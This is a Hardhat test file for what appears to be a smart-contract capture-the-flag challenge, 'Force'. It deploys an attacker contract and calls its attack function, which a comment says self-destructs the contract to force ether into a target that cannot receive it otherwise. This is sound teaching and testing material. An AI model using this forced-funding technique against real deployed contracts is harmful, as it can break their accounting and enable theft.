const { ethers, network } = require("hardhat")
const { expect } = require("chai")
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { utils } = require("mocha")

describe("Challenge 7 - Force", function () {
    const amountToFund = "1"
    async function initialStateFixture() {
        const [deployer, addr1] = await ethers.getSigners()
        const provider = new ethers.providers.Web3Provider(network.provider)

        const Force = await ethers.getContractFactory("Force")
        const targetContract = await Force.deploy()
        await targetContract.deployed()

        const N7Attacker = await ethers.getContractFactory("N7Attacker")
        const maliciousContract = await N7Attacker.deploy()
        await maliciousContract.deployed()

        return { deployer, addr1, provider, targetContract, maliciousContract }
    }

    describe("Initial State", function () {
        it("Should deploy contract with correct deployer", async function () {
            const { deployer, targetContract } = await loadFixture(initialStateFixture)

            expect(targetContract.deployTransaction.from).to.equal(deployer.address)
        })

        it("Should have zero balance", async function () {
            const { provider, targetContract } = await loadFixture(initialStateFixture)

            expect(await provider.getBalance(targetContract.address)).to.equal(0)
        })
    })

    describe("Attack Execution", function () {
        it("Should fund target contract", async function () {
            const { addr1, provider, targetContract, maliciousContract } = await loadFixture(initialStateFixture)

            const txn = {
                to: maliciousContract.address,
                value: ethers.utils.parseEther(amountToFund)
            }

            //first we fund the malicious contract with some funds
            const txResp = await addr1.sendTransaction(txn)
            await txResp.wait()

            expect(await provider.getBalance(maliciousContract.address)).to.equal(
                ethers.utils.parseEther(amountToFund)
            )

            /*
                next, we call the attack function which self destructs the contract and 
                sends all funds in it to the target contract
            */
            const resp = await maliciousContract.connect(addr1).attack(targetContract.address)
            await resp.wait()

            expect(await provider.getBalance(targetContract.address)).to.equal(
                ethers.utils.parseEther(amountToFund)
            )
        })
    })
})